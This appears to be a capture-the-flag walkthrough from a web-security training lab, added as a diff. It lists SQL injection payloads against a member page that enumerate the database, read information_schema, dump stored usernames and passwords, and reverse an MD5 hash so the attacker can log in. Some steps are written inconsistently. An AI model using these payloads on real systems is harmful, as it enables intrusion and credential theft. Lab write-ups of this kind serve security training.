@@ -1,0 +1,22 @@
+in the page member
+
+1: 1 UNION SELECT DATABASE(), USER() #
+
+=> database = Member_Sql_Injection and defaut user = borntosec@localhost
+
+2: 1 UNION SELECT table_schema, table_name FROM information_schema.tables #
+
+=> I see all tables in db
+
+
+3: SELECT table_name, column_name FROM information_schema.columns #
+
+=> table password is in Member_Brute_Force.db_default
+
+
+4: SELECT password, username FROM memberbruteforce.db_default
+
+
+=> reverse root md5 password
+
+5: connexion ok =)
